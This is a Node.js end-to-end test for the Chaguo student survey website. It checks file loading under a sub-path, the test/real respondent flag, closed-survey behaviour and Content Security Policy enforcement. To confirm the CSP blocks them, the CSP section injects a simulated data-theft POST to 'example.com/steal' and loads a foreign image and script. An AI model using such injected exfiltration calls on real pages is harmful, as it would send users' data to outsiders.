// "Live site" test: the survey exactly as the workflow publishes it (built by scripts/build-site.mjs),
// served under the /Chaguo/ sub-path like GitHub Pages, on a made-up PUBLIC hostname (chaguo.test, mapped to
// this machine), with the shipped security policy (CSP) in force.
//
//   node tests/live.test.mjs
//
// Checks: every file loads under /Chaguo/; the CSP blocks outsiders but never blocks the survey itself;
// is_test is "no" on a public host and "yes" with ?test=1 (and ?test=1 shows no debug button);
// SURVEY_OPEN = false closes the survey and nothing is ever sent; the WhatsApp text uses the real URL.
// A local mock stands in for Google; the only change to the shipped files is that mock's address in
// connect-src and js/config.js. Needs Node 22+ and Chrome or Edge, like the other browser tests.
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { launchBrowser, sleep } from './lib/cdp.mjs';
import { startMock } from './lib/mock-endpoint.mjs';
import { serveUnderPrefix, makeSiteCopy, SURVEY_DIR, REAL_SURVEY_URL } from './lib/site.mjs';
import { buildSite } from '../scripts/build-site.mjs';

const HOST = 'chaguo.test';
const QUEUE_KEY = 'chaguo_send_queue_v1';
const shippedHtml = fs.readFileSync(path.join(SURVEY_DIR, 'index.html'), 'utf8'); // the repo's index.html (before bundling)

// What gets published is BUILT by scripts/build-site.mjs (scripts joined into js/survey.js), from a temp
// source copy whose config.js and CSP are set for each scenario. So this test runs against the bundled build.
const src = makeSiteCopy();
const site = path.join(fs.mkdtempSync(path.join(os.tmpdir(), 'chaguo-live-')), 'chaguo-site');
let built;
const mock = await startMock();
function configure({ open = true, endpoint = mock.url, omitOpen = false } = {}) {
  src.configure({ endpoint, sendMode: 'cors', open: omitOpen ? 'omit' : open, connectOrigin: mock.origin });
  built = buildSite(site, src.dir);
}
configure();
const server = await serveUnderPrefix(site, '/Chaguo/');
const ORIGIN = `http://${HOST}:${server.port}`;
const URL_ROOT = `${ORIGIN}/Chaguo/`;

const b = await launchBrowser({ args: [`--host-resolver-rules=MAP ${HOST} 127.0.0.1`] });
const { ev, nav, send, logs } = b;
await send('Network.enable');
await send('Page.addScriptToEvaluateOnNewDocument', { source: `window.__csp=[];document.addEventListener('securitypolicyviolation',function(e){window.__csp.push(e.violatedDirective+' '+e.blockedURI)});` });

const results = [];
const check = (name, cond, extra = '') => { results.push(!!cond); console.log((cond ? '  ok    ' : '  FAIL  ') + name + (extra ? '  ' + extra : '')); };
const visible = () => ev(`[...document.querySelectorAll('[data-screen]')].filter(e=>!e.hidden).map(e=>e.dataset.screen).join(',')`);
const click = (sel) => ev(`document.querySelector(${JSON.stringify(sel)}).click()`);
const change = (sel) => `(()=>{const i=document.querySelector(${JSON.stringify(sel)}); i.checked=true; i.dispatchEvent(new Event('change',{bubbles:true}));})()`;
const answerAll = (v) => ev(`document.querySelectorAll('#items-list .item').forEach(fs=>{const i=fs.querySelector('input[value="${v}"]'); i.checked=true; i.dispatchEvent(new Event('change',{bubbles:true}));})`);
const pick = (name, value) => ev(change(`#background-list input[name="${name}"][value="${value}"]`));
const typeIn = (name, text) => ev(`(()=>{const i=document.querySelector('#background-list input[name="${name}"]'); i.value=${JSON.stringify(text)}; i.dispatchEvent(new Event('input',{bubbles:true}));})()`);
async function waitFor(fn, ms = 5000) { const end = Date.now() + ms; while (Date.now() < end) { if (await fn()) return true; await sleep(40); } return false; }
async function open(query = '') {
  await nav(URL_ROOT + 'blank-then-clear'); // a 404 page on our origin, only so sessionStorage can be cleared
  await ev('sessionStorage.clear()');
  server.log.length = 0;
  await nav(URL_ROOT + query);
}
async function walk() {
  await click('#start-agree');
  for (let s = 1; s <= 6; s++) {
    await answerAll(3);
    if (s === 4) await ev(change('input[name=attention_check][value="1"]'));
    await click('#items-next');
  }
  await typeIn('course', 'BSc Computer Science');
  await pick('uni_type', 'private'); await pick('year_of_study', 'year_3'); await pick('admission_route', 'direct'); await pick('switched_course', 'no');
  await click('#background-next');
  await pick('satisfaction', '4'); await pick('choose_again', 'yes'); await pick('gender', 'male'); await pick('age_band', '21_23');
  await click('#background-next');
}

console.log('\n  -- published as built, served under /Chaguo/ on a public hostname --');
await open();
check('the opening screen shows', (await visible()) === 'start');
const reqs = server.log.filter((r) => r.url !== '/Chaguo/blank-then-clear');
check('every file the page asks for is found (no 404s)', reqs.length >= 4 && reqs.every((r) => r.status === 200), JSON.stringify(reqs.filter((r) => r.status !== 200)));
check('all requests are under /Chaguo/', reqs.every((r) => r.url.startsWith('/Chaguo/')));
check('the page loaded the built files only: css, ONE script (js/survey.js), logo, favicon', ['css/styles.css', 'js/survey.js', 'assets/chaguo-logo-transparent.png', 'assets/favicon-32.png'].every((f) => reqs.some((r) => r.url === '/Chaguo/' + f)) && reqs.every((r) => built.files.includes(r.url.replace('/Chaguo/', '')) || r.url === '/Chaguo/'));
check('index.html has exactly one <script> tag and the separate script files are not published', (await ev(`document.querySelectorAll('script[src]').length`)) === 1 && !built.files.some((f) => /^js\//.test(f) && f !== 'js/survey.js'), built.files.filter((f) => f.startsWith('js/')).join(','));
check('a source file such as js/app.js is a 404 on the live site (only the bundle exists)', (await fetch(`http://127.0.0.1:${server.port}/Chaguo/js/app.js`)).status === 404 && (await fetch(`http://127.0.0.1:${server.port}/Chaguo/js/survey.js`)).status === 200);
check('the logo displayed (decoded, not a broken image)', await ev(`(()=>{const i=document.querySelector('.site-header img'); return i.complete && i.naturalWidth>0;})()`));
check('this test page is not a secure context (plain http), so the walk-through below also exercises the fallback response id', await ev(`window.isSecureContext === false`));
check('no security-policy violations just from loading', (await ev('window.__csp')).length === 0, JSON.stringify(await ev('window.__csp')));

console.log('\n  -- the security policy (CSP) is enforced, and the survey still works through it --');
await ev(`fetch('https://example.com/steal',{method:'POST',body:'x'}).catch(function(){})`);
await ev(`(()=>{const i=new Image(); i.src='http://other.test/pixel.png';})()`);
await ev(`(()=>{const s=document.createElement('script'); s.src='https://cdn.example.com/x.js'; document.head.appendChild(s);})()`);
await sleep(300);
const csp = await ev('window.__csp');
check('a connection to another site is blocked (connect-src)', csp.some((v) => /^connect-src https:\/\/example\.com/.test(v)), JSON.stringify(csp));
check('an image from another site is blocked (img-src)', csp.some((v) => /^img-src http:\/\/other\.test/.test(v)));
check('a script from another site is blocked (script-src)', csp.some((v) => /^script-src.* https:\/\/cdn\.example\.com/.test(v)));
mock.reset('ok');
await open();
await walk();
await waitFor(() => mock.stored.length >= 9);
check('the whole survey runs and reaches results', (await visible()) === 'results');
check('all 9 snapshots were saved through the policy', mock.stored.length === 9, `got ${mock.stored.length}`);
check('and not one CSP violation happened while the survey ran (including sending)', (await ev('window.__csp')).length === 0, JSON.stringify(await ev('window.__csp')));
check('the policy meta tag is the shipped one (only the mock address was added to connect-src)', await ev(`document.querySelector('meta[http-equiv="Content-Security-Policy"]').content`) === shippedHtml.match(/http-equiv="Content-Security-Policy" content="([^"]*)"/)[1].replace('connect-src https://script.google.com', `connect-src ${mock.origin} https://script.google.com`));

console.log('\n  -- real respondents vs testers (is_test) --');
check('public site, no parameters: is_test is "no" on every row', mock.stored.length === 9 && mock.stored.every((s) => s.is_test === 'no'), mock.stored.map((s) => s.is_test).join(','));
const shareHref = await ev(`document.getElementById('results-share').href`);
check('WhatsApp share text uses the real survey address', decodeURIComponent(shareHref).endsWith(' — find yours: ' + REAL_SURVEY_URL) && REAL_SURVEY_URL === 'https://fadhili-22.github.io/Chaguo/', decodeURIComponent(shareHref));
check('reference code line is shown', /^[0-9a-f]{8}$/.test(await ev(`document.getElementById('results-ref-code').textContent`)));

mock.reset('ok');
await open('?test=1');
check('?test=1: the debug button is NOT shown', await ev(`document.getElementById('debug-bar').hidden`));
await walk();
await waitFor(() => mock.stored.length >= 9);
check('?test=1: all rows say is_test "yes"', mock.stored.length === 9 && mock.stored.every((s) => s.is_test === 'yes'), mock.stored.map((s) => s.is_test).join(','));
check('?test=1: the survey itself behaves normally (results, same 89 fields)', (await visible()) === 'results' && mock.stored.every((s) => Object.keys(s).length === 89));

mock.reset('ok');
await open('?test=0');
await walk();
await waitFor(() => mock.stored.length >= 9);
check('?test=0 (anything but 1) does not count as a test', mock.stored.length === 9 && mock.stored.every((s) => s.is_test === 'no'));

mock.reset('ok');
await open('?debug=1');
check('?debug=1 still shows the debug button', (await ev(`document.getElementById('debug-bar').hidden`)) === false);
await click('#debug-fill');
await waitFor(() => mock.stored.length >= 1);
check('?debug=1 still fills and finishes, and the row says is_test "yes"', (await visible()) === 'results' && mock.stored.length === 1 && mock.stored[0].is_test === 'yes' && mock.stored[0].stage === 'complete');

console.log('\n  -- SURVEY_OPEN = false: the survey is closed and nothing is ever sent --');
configure({ open: false });
mock.reset('ok');
await open();
check('the closed screen shows instead of the opening screen', (await visible()) === 'closed');
check('it says exactly: "This survey has now closed. Thank you for your interest."', await ev(`document.getElementById('screen-closed').textContent.includes('This survey has now closed. Thank you for your interest.')`));
check('it shows the contact email as a mailto link', await ev(`!!document.querySelector('#screen-closed a[href="mailto:njenga.munyua@strathmore.edu"]')`));
check('no consent button and no survey screen is on show', await ev(`['start-agree','start-underage'].every(id=>document.getElementById(id).offsetParent===null)`) && !(await ev(`document.body.innerText`)).includes('Before you start'));
check('page title and heading make sense (h1 "Survey closed")', await ev(`document.querySelector('#screen-closed h1').textContent`) === 'Survey closed');
await ev(`document.getElementById('start-agree').click()`);
check('even clicking the hidden start button does nothing', (await visible()) === 'closed');
await open('?debug=1');
check('closed + ?debug=1: still closed, no debug button', (await visible()) === 'closed' && (await ev(`document.getElementById('debug-bar').hidden`)));
await ev(`window.dispatchEvent(new Event('pagehide')); document.dispatchEvent(new Event('visibilitychange'))`);
// Pretend an old session left an unsent snapshot behind: a closed survey must not send it
await ev(`sessionStorage.setItem('${QUEUE_KEY}', JSON.stringify({seq:1,rejected:0,snapshot:{response_id:'3f2b8c1e-9d4a-4c6b-8e1f-0a7d5b2c9e44',schema_version:'3',stage:'screen_2'}}))`);
await nav(URL_ROOT);
await ev(`window.dispatchEvent(new Event('online'))`);
check('Sender says saving is off and send() makes no request', await ev(`window.ChaguoSender.enabled() === false`) && (await ev(`window.ChaguoSender.send({response_id:'x'}).then(function(v){return v===true})`)));
await sleep(500);
check('a leftover queue from an earlier session is not sent either', mock.requests.length === 0, `${mock.requests.length} request(s)`);
check('nothing at all reached the endpoint while closed', mock.requests.length === 0 && mock.stored.length === 0);

configure({ omitOpen: true });
await open();
check('a config.js with no SURVEY_OPEN line at all counts as closed (fails closed)', (await visible()) === 'closed');
configure({ open: 'yes' });
await open();
check('SURVEY_OPEN set to something other than true counts as closed', (await visible()) === 'closed');
configure({ open: true });
await open();
check('SURVEY_OPEN = true opens it again', (await visible()) === 'start');

const errs = logs.filter((l) => l.type === 'EXCEPTION' || l.type === 'error');
check('no JS errors', errs.length === 0, errs.length ? JSON.stringify(errs).slice(0, 400) : '');

const failed = results.filter((r) => !r).length;
console.log(`\n${results.length - failed}/${results.length} checks passed`);
await b.close();
await server.close();
await mock.close();
src.cleanup();
try { fs.rmSync(path.dirname(site), { recursive: true, force: true }); } catch {}
process.exit(failed ? 1 : 0);
